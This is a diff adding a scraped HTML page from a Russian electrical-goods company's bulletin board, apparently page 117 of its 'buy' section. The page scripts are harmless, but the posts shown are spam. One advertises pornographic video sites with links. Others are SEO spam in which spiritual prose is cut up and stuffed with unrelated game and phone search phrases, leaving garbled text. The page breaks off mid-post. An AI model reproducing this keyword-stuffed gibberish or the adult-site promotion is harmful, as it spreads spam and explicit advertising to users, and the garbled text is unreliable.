@@ -1,0 +1,250 @@
+<html>
+<head>
+<title>Электромарк -
+Доска объявления</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<META Name="keywords" Content="">
+<META Name="description" Content="">
+<link rel="stylesheet" href="http://electroniks.com.ru/style.css" type="text/css">
+<SCRIPT language=JavaScript type=text/javascript>
+
+   function show_window(width,height, url)
+   {
+        var p_top=(window.screen.height-height)/2, p_left=(window.screen.width-width)/2;
+        var imgnwin=window.open(url,"imgswin","resizable=yes,scrollbars=yes,toolbar=no,location=no,directoties=no,status=no,menubar=no,width="+width+",height="+height+",top="+p_top+",left="+p_left);
+        imgnwin.focus();
+   }
+
+  </SCRIPT>
+<script language="JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+// -->
+</script>
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000" leftmargin="1" topmargin="1">
+
+
+<!--
+<div id="Layer1" style="position:absolute; left:20px; top:20px; width:68px; height:56px; z-index:1">
+<img src="images/logo.gif">
+</div>
+<div id="Layer2" style="position:absolute; left:182px; top:60px; width:300px; height:56px; z-index:1;color:#000000; font-size:13px;">
+ЭЛЕКТРОТЕХНИЧЕСКАЯ КОМПАНИЯ
+</div>
+-->
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#6888B8" width="81%" valign="top" height="90" background="http://electroniks.com.ru/images/big_line.jpg">
+      <table width="98%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <!--<td width="69%"  height="88" style="padding-left:180px;color:#FFFFFF;font-size:40px; font-family:Tahoma; letter-spacing: 5px"><i>Электромарк</i></td>-->
+          <td width="69%"  height="88" style="padding-left:30px;"><img src="http://electroniks.com.ru/images/logo1.gif"></td>
+          <td width="31%">
+                      </td>
+        </tr>
+        <tr align="left">
+          <td valign="top" background="http://electroniks.com.ru/images/poloska.jpg" colspan="2" style="padding-left:146px;"><a href="http://electroniks.com.ru/catalog/index.html"><img src="http://electroniks.com.ru/images/katalog_ser.jpg" width="113" height="19" border="0"></a><a href="http://electroniks.com.ru/search.html"><img src="http://electroniks.com.ru/images/poisk_ser.jpg" width="112" height="19" border="0"></a><a href="http://electroniks.com.ru/board/"><img src="http://electroniks.com.ru/images/doska.jpg" width="162" height="19" border="0"></a><a href="http://electroniks.com.ru/korzina/show.html"><img src="http://electroniks.com.ru/images/zakaz_ser.jpg" width="134" height="19" border="0"></a></td>
+        </tr>
+      </table>
+    </td>
+    <td bgcolor="#6888B8" align="left" width="19%" height="90" style="padding-top:30px;" background="http://electroniks.com.ru/images/big_line.jpg">
+      <font style="font-family:Tahoma; font-size:12px; color: #FFFFFF">ООО "Электромарк"<br>тел.: (495) 995-58-75<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(812) 448-08-75<br>
+    <a style="font-family:Tahoma; font-size:12px; color: #FFFFFF" href="mailto:elektromark@elektromark.ru">elektromark@elektromark.ru</a>
+    </font>
+
+    </td>
+  </tr>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td valign="top">
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr>
+          <td background="http://electroniks.com.ru/images/design/menu_bg.gif" class="menu" height="16"> <img src="http://electroniks.com.ru/images/design/bullet.gif" width="22" height="18" align="absmiddle">
+            Доска объявления          </td>
+        </tr>
+        <tr>
+          <td align="center">
+            <table width="99%" border="0" cellspacing="0" cellpadding="0"  height=500>
+              <tr>
+                <td width="12"><img src="http://electroniks.com.ru/images/design/n1.gif" width="12" height="13"></td>
+                <td background="http://electroniks.com.ru/images/design/n2.gif" height="13"></td>
+                <td width="11"><img src="http://electroniks.com.ru/images/design/n3.gif" width="11" height="13"></td>
+              </tr>
+              <tr height=100%>
+                <td background="http://electroniks.com.ru/images/design/n4.gif"></td>
+                <td height="50" valign="top">                                                      
+  <table align=center width=80%><tr><td>
+  <a href="http://electroniks.com.ru/board/add-message.html"><strong>Добавить сообщение</strong></a>
+  &nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/search.html"><strong>Поиск по сообщениям</strong></a>
+  <br><br><a href="http://electroniks.com.ru/board/"><strong>Все разделы</strong></a>
+  &rarr; <a href="http://electroniks.com.ru/board/"><strong>Элетротехника</strong></a><br><br><big><font face=Arial><strong>Куплю</strong></font></big></center><br><table border=0 width=100%><tr><td width=25% align=right> <a href="http://electroniks.com.ru/board/index-9-page-116.html#begin">Предыдущая страница</a>&nbsp;&nbsp;<td width=30% align=center>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-1.html#begin">1</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-2.html#begin">2</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-3.html#begin">3</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-4.html#begin">4</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-5.html#begin">5</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-6.html#begin">6</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-7.html#begin">7</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-8.html#begin">8</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-9.html#begin">9</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-10.html#begin">10</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-11.html#begin">11</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-12.html#begin">12</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-13.html#begin">13</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-14.html#begin">14</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-15.html#begin">15</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-16.html#begin">16</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-17.html#begin">17</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-18.html#begin">18</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-19.html#begin">19</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-20.html#begin">20</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-21.html#begin">21</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-22.html#begin">22</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-23.html#begin">23</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-24.html#begin">24</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-25.html#begin">25</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-26.html#begin">26</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-27.html#begin">27</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-28.html#begin">28</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-29.html#begin">29</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-30.html#begin">30</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-31.html#begin">31</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-32.html#begin">32</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-33.html#begin">33</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-34.html#begin">34</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-35.html#begin">35</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-36.html#begin">36</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-37.html#begin">37</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-38.html#begin">38</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-39.html#begin">39</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-40.html#begin">40</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-41.html#begin">41</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-42.html#begin">42</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-43.html#begin">43</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-44.html#begin">44</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-45.html#begin">45</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-46.html#begin">46</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-47.html#begin">47</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-48.html#begin">48</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-49.html#begin">49</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-50.html#begin">50</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-51.html#begin">51</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-52.html#begin">52</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-53.html#begin">53</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-54.html#begin">54</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-55.html#begin">55</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-56.html#begin">56</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-57.html#begin">57</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-58.html#begin">58</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-59.html#begin">59</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-60.html#begin">60</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-61.html#begin">61</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-62.html#begin">62</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-63.html#begin">63</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-64.html#begin">64</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-65.html#begin">65</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-66.html#begin">66</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-67.html#begin">67</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-68.html#begin">68</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-69.html#begin">69</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-70.html#begin">70</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-71.html#begin">71</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-72.html#begin">72</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-73.html#begin">73</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-74.html#begin">74</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-75.html#begin">75</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-76.html#begin">76</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-77.html#begin">77</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-78.html#begin">78</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-79.html#begin">79</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-80.html#begin">80</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-81.html#begin">81</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-82.html#begin">82</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-83.html#begin">83</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-84.html#begin">84</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-85.html#begin">85</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-86.html#begin">86</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-87.html#begin">87</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-88.html#begin">88</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-89.html#begin">89</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-90.html#begin">90</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-91.html#begin">91</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-92.html#begin">92</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-93.html#begin">93</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-94.html#begin">94</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-95.html#begin">95</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-96.html#begin">96</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-97.html#begin">97</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-98.html#begin">98</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-99.html#begin">99</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-100.html#begin">100</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-101.html#begin">101</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-102.html#begin">102</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-103.html#begin">103</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-104.html#begin">104</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-105.html#begin">105</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-106.html#begin">106</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-107.html#begin">107</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-108.html#begin">108</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-109.html#begin">109</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-110.html#begin">110</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-111.html#begin">111</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-112.html#begin">112</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-113.html#begin">113</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-114.html#begin">114</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-115.html#begin">115</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-116.html#begin">116</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-117.html#begin"><b><big>117</big></b></a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-118.html#begin">118</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-119.html#begin">119</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-120.html#begin">120</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-121.html#begin">121</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-122.html#begin">122</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-123.html#begin">123</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-124.html#begin">124</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-125.html#begin">125</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-126.html#begin">126</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-127.html#begin">127</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-128.html#begin">128</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-129.html#begin">129</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-130.html#begin">130</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-131.html#begin">131</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-132.html#begin">132</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-133.html#begin">133</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-134.html#begin">134</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-135.html#begin">135</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-136.html#begin">136</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-137.html#begin">137</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-138.html#begin">138</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-139.html#begin">139</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-140.html#begin">140</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-141.html#begin">141</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-142.html#begin">142</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-143.html#begin">143</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-144.html#begin">144</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-145.html#begin">145</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-146.html#begin">146</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-147.html#begin">147</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-148.html#begin">148</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-149.html#begin">149</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-150.html#begin">150</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-151.html#begin">151</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-152.html#begin">152</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-153.html#begin">153</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-154.html#begin">154</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-155.html#begin">155</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-156.html#begin">156</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-157.html#begin">157</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-158.html#begin">158</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-159.html#begin">159</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-160.html#begin">160</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-161.html#begin">161</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-162.html#begin">162</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-163.html#begin">163</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-164.html#begin">164</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-165.html#begin">165</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-166.html#begin">166</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-167.html#begin">167</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-168.html#begin">168</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-169.html#begin">169</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-170.html#begin">170</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-171.html#begin">171</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-172.html#begin">172</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-173.html#begin">173</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-174.html#begin">174</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-175.html#begin">175</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-176.html#begin">176</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-177.html#begin">177</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-178.html#begin">178</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-179.html#begin">179</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-180.html#begin">180</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-181.html#begin">181</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-182.html#begin">182</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-183.html#begin">183</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-184.html#begin">184</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-185.html#begin">185</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-186.html#begin">186</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-187.html#begin">187</a>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-188.html#begin">188</a><td width=25% align=left>&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/index-9-page-118.html#begin">Следующая страница</a></table><table width=100% border=0><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8525.html"><strong><big>Важно: ПОРНО ВИДЕО С НЕНАСЫТНЫМИ ДЕВЧОНКАМИ! НОВИНКА</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>info@pogodanews.ru <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8525.html">Надоело искать сайты с видеороликами и решил открыть проект в котором можно будет меняться ссылками на лучшие порно видео ролики. Сайт devochki.cn/molodye.html <br />
+Хотелось бы узнать, Ваше мнение о нем! <br />
+Порно ненасытными девчонками! <br />
+ <br />
+http://galleries.18yearsold.com/pb01/pb01_presleymaddox/01.jpg <br />
+_____ <br />
+Вороник  Нина</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8526.html"><strong><big>Мы не можем усиливать течение</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>atroptess@mail.ru <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8526.html">Человек может быть целостным, он может игра яйца фабержеприключение  принадлежать как к миру материи, так и к игры nokia 3250  миру духа. Ему не удается найти результативный игрок  себя в окружении бессмысленности, скуки, страданий. Трудно подвижные игры на воздухе в школе-открытое занятие  веселиться, когда в животе пусто, когда болеет тело, когда 3d игры про секс  повсюду окружает смерть; в таких условиях экономическая игра бизнесмен  медитация невозможна. Восток породил Гаутаму Будду, Махавиру, Патанджали, Кабира, калининград игровые залы компьютерные  Фарида, Райдаса - целую плеяду лиц бесплатные игры sony ericsson  с высокоразвитым сознанием и высокой осознанностью. Но вся скачать кряк для игры по сети counter strike - source  Вселенная - это не что иное, как новые амазонки игра  энергетическое поле. Это свидетельство отсутствия конфликта видеоролики из игры рандеву с незнакомкои  между материей и духом, доказательство возможности школа игры на русском бильярде  быть счастливым и материально, и духовно. Многим <br />
+из sis игры для смартфона  нас доводилось слышать не теряющий своей популярности совет скачаиь бесплатно игры для motorola e 398 с версией 1.0.0  доверьтесь процессу. Это - способность признавать как свои как пройти игру десять негритят  ошибки и слабости, так и свои таланты и силу. напольная игра твистер россия купить интернет-магазин 500  Его бунтарство направлено на избавление человека от шизофрении, на лучшие игры 2006 рейтинг  избавление его от разделенности: он разрушает духовность, файлы к игре need for speed underground 2  стоящую в оппозиции к материи, и он разрушает морис равель игра воды  материализм, стоящий в оппозиции к духовности. ну зачем ты играешь со мной спать не даешь петь не даешь  Не было бы создано столько ядерных скачать без регистрации игра баланс  арсеналов, если бы понимали, что в скачать бесплатно свадебные игры  каждом человеке внутри скрывается Бог, что в казаки игра  каждом человеке внутри скрыто величие; его игруля  нельзя уничтожать, его нужно постигать; его инстинкт война это онлайн игра  нельзя убивать, его <br />
+нужно полностью раскрыть; ведь каждый игры хоккей  человек - это храм Божий. Еще один секреты игры sims 2  вид нашей реакции на хаос, происходящий в мире - игры для nokia n серии бесплатно  это его отрицание. В поэзии и в духовных метафорах бесплатно скачать java игра война миров через кабель  спокойствие представляется как чистое спокойное озеро в безветренный день, игра титаник английская версия  которому не страшны ни бури, ни перемены. Старинная игр  пословица все хорошее приходит к тому, кто умеет ждать игр  применима к нашему путешествию, направленному на игр  новое открытие себя. Но он также породил и игр  миллионы бедняков, умирающих с голоду, умирающих, игр  как собаки, у которых нет ни рыбы ни мяса.</a></table></table><br><tr><td><table rules=all style=" border-collapse: collapse; border: black 1px; border-style: solid;" width=100% border=1 cellpadding=0 cellspacing=0 align=center>
+                    <tr><td bgcolor=#A5B6C8 colspan=3>&nbsp;&nbsp;&nbsp;<a href="http://electroniks.com.ru/board/show-message-8527.html"><strong><big>Мы не можем усиливать течение</big></strong></a><tr><td align=center><font face=Arial size=2>12.09.2007<td align=center width=50%><font face=Arial size=2><font face=Arial size=2>atroptess@mail.ru <td align=center><font face=Arial size=2> Ответов:0<tr><td colspan=3><table align=center border=0 width=95%><tr><td><a href="http://electroniks.com.ru/board/show-message-8527.html">Человек может быть целостным, он может мобильные игры sis  принадлежать как к миру материи, так и к купить игру кошки мышки  миру духа. Ему не удается найти игры на сони эриксон k750i  себя в окружении бессмысленности, скуки, страданий. Трудно продам микросхемы для игровых автоматов  веселиться, когда в животе пусто, когда болеет тело, когда игра пропасть  повсюду окружает смерть; в таких условиях коды на игру gtasan 